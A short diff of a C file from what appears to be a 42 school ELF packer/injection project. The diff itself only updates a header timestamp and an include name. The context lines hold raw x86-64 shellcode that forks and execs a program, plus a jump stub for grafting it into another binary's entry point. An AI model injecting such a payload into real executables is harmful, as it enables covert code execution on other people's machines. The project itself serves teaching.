@@ -6,11 +6,11 @@
 /*   By: dhubleur <dhubleur@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/05/22 13:07:13 by dhubleur          #+#    #+#             */
-/*   Updated: 2024/06/11 21:56:38 by jmaia            ###   ###               */
+/*   Updated: 2024/06/12 22:04:21 by jmaia            ###   ###               */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "injection.h"
+#include "woody.h"
 
 char payload[] = "\x55\x50\x57\x56\x52\x53\xb8\x39\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x75\x24\xb8\x3b\x00\x00\x00\x48\x8d\x3d\x23\x00\x00\x00\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\x5b\x5a\x5e\x5f\x58\x5d";
 char jmp[] = "\xe9\x00\x00\x00\x00";
